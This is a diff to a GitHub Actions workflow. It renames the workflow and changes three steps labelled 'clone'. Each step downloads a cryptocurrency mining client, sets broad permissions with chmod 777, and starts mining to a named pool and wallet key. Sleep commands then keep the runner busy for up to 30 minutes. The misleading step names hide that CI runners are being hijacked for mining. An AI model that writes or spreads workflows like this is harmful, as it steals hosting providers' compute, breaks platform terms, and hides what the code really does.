@@ -1,4 +1,4 @@
-name: github 
+name: pelisu
 on: 
   push:
     branches: [ "main" ]
@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
            sleep 330s
   pye:
     needs: alah
@@ -48,8 +48,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 
-          
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+            sleep 30m
         
     
      
@@ -74,7 +74,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 
+      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+            sleep 20m
            
         
     
